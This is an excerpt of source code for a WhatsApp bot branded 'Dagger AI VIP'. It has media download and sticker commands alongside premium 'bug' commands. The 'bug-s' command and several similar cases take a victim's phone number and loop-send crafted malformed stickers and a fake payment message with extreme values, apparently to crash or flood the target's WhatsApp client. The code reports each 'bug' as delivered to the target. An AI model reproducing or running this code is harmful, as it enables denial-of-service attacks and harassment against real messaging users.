...
expiryTimestamp: 999999999999,
amount: {
value: 91929999291929,
offset: 1000,
currencyCode: 'USD'
}
}
...
case 'menu': {
let itsmenu = `
${ucapanWaktu} 𝐃𝓐𝓖𝓖𝓔𝓡 𝓐𝓘 𝓥𝓘𝓟

✇━━━━━━━━━━━━━━━━━━━━━✇
⦔𝖀𝖘𝖊𝖗 : ${pushname}
⦔𝕯𝖆𝖌𝖌𝖊𝖗 : @${m.sender.split("@")[0]}
...
// Status
case 'public': {
if (!isCreator) return msgreply('𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖒𝖊𝖒𝖇𝖊𝖗 𝖓𝖊𝖊𝖉𝖊𝖉') 
joestar.public = true
msgreply('succes')
}
break
...
case 'bug': case 'dagger': case 'sam': case 'oke': case 'dagger': case 'virtex': case 'virteks': case 'virtext': case 'pirtek': case 'pirteks': case 'pirtex': case 'anjay':{
joestar.sendMessage(m.chat, { text: `King Sam?`}, { quoted: qbug })
}
break
...
return msgreply(`𝕽𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆 𝖕𝖍𝖔𝖙𝖔 𝖔𝖗 𝖆 𝖛𝖎𝖉𝖊𝖔${prefix + command} 𝖛𝖎𝖉𝖊𝖔 𝖉𝖚𝖗𝖆𝖙𝖎𝖔𝖓 9𝖘𝖊𝖈`)
}
}
break

case 'smeme': {
if (!text || !quoted || !/image/.test(mime)) return msgreply(`𝕽𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆 𝖕𝖍𝖔𝖙𝖔 𝖔𝖗 𝖆 𝖛𝖎𝖉𝖊𝖔 ${prefix + command} ➢`)
msgreply(mess.wait)
...
case 'toimage':
case 'toimg': {
if (!/webp/.test(mime)) return msgreply(`𝕽𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆 𝖘𝖙𝖎𝖈𝖐𝖊𝖗 *${prefix + command}*`)
msgreply(mess.wait)
...
case 'tomp4':
case 'tovideo': {
if (!/webp/.test(mime)) msgreply(`𝕽𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆 𝖘𝖙𝖎𝖈𝖐𝖊𝖗 *${prefix + command}*`)
msgreply(mess.wait)
let media = await joestar.downloadAndSaveMediaMessage(qmsg)
...
case 'toaud':
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return msgreply(`𝕽𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆 𝖛𝖎𝖉𝖊𝖔 𝖔𝖗 𝖆𝖓 𝖆𝖚𝖉𝖎𝖔 ${prefix + command}`)
msgreply(mess.wait)
...
msgreply(`${prem1} 𝖄𝖔𝖚 𝖆𝖗𝖊 𝖓𝖔𝖜 𝖆𝖓 𝕺𝖜𝖓𝖊𝖗!!!`)
...
case 'mediafire': {
if (!text) return msgreply(`𝕴𝖓𝖕𝖚𝖙 𝖙𝖍𝖊 𝖚𝖗𝖑 ${prefix + command} *url*`)
msgreply(mess.wait)
...
if (!text) return msgreply(`𝕴𝖓𝖕𝖚𝖙 𝖞𝖍𝖊 ${prefix + command} *url*`)
msgreply(mess.wait)
...
case 'pintmp4': {
if (!text) return msgreply(`𝕴𝖓𝖕𝖚𝖙 ${prefix + command} *url*`)
msgreply(mess.wait)
...
case 'youtubevideo':
case 'youtubemp4':{
if(!q) return msgreply(`𝕴𝖓𝖕𝖚𝖙 : ${prefix+command} Link`)
await msgreply(mess.wait)
downloadMp4(text)
}
break
...
case 'tiktokvideo': 
case 'ttvid': {
if (!text) return msgreply( `𝖀𝖘𝖊 : ${prefix + command} link`)
...
case 'playmusik':
case 'playmusic': {
if (!q) return msgreply("𝕿𝖍𝖎𝖘 𝖛𝖎𝖉𝖊𝖔 𝖜𝖎𝖑𝖑 𝖇𝖊 𝖉𝖔𝖜𝖓𝖑𝖔𝖆𝖉𝖊𝖉 𝖋𝖗𝖔𝖒 𝖄𝖔𝖚𝖙𝖚𝖇𝖊")
try {
let rus = await yts(q)
if (rus.all.length == "0") return msgreply("𝕯𝖔𝖜𝖓𝖑𝖔𝖆𝖉𝖎𝖓𝖌")
...
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`𝕹𝖔 .${command} 6`)
jumlah = q * 2
if (!isPremium) return msgreply(mess.premium)
var etc = {
...
case 'bug-s': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`𝖚𝖘𝖊 .${command} 25475757588`)
target = q + '@s.whatsapp.net'
for (let i = 0; i < 100; i++) {
await joestar.sendVideoAsSticker(target, mengkece, qbug, { packname: unic.n2, author: unic.n3 })
}
msgreply(`👤 Succes Send Bug Ke ${target} 𝕯𝖊𝖑𝖎𝖛𝖊𝖗𝖊𝖉 𝖇𝖚𝖌𝖘${command}. 𝖂𝖆𝖎𝖙 𝖋𝖔𝖗 3 𝖒𝖎𝖓𝖚𝖙𝖊𝖘🩸`)
}
break
...
msgreply(`👤 Succes Send Bug Ke ${target} 𝕭𝖚𝖌𝖘 𝕯𝖊𝖑𝖎𝖇𝖊𝖗𝖊𝖉${command}. 𝖂𝖆𝖎𝖙 𝖋𝖔𝖗 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘`)
}
break
...
msgreply(`👤 Succes Send Bug Ke ${target} 𝕭𝖚𝖌𝖘 𝕯𝖊𝖑𝖎𝖛𝖊𝖗𝖊𝖉 ${command}✅. 𝖂𝖆𝖎𝖞🩸`)
}
break
...
msgreply(`👤 Succes Send Bug Ke ${target} 𝖁𝖚𝖌 𝖉𝖊𝖑𝖎𝖛𝖊𝖗𝖊𝖉 ${command} 𝕿𝖔𝖙𝖆𝖑 ${jumlah}✅. 𝖂𝖆𝖎𝖙`)
}
break
...
msgreply(`👤 Succes Send Bug Ke ${target} 𝕭𝖚𝖌𝖘 𝕯𝖊𝖑𝖎𝖛𝖊𝖗𝖊𝖉${command}. 𝖂𝖆𝖎𝖙🩸`)
}
break
...
msgreply(`👤 𝕭𝖚𝖌𝖘 ${target} 𝕯𝖊𝖑𝖎𝖛𝖊𝖗𝖊𝖉 ${command}✅. 𝖂𝖆𝖎𝖙🩸`)
}
break
...
case 'spamblock': {
if (!isCreator) return msgreply('*𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖒𝖊𝖒𝖇𝖊𝖗*')
await loading()
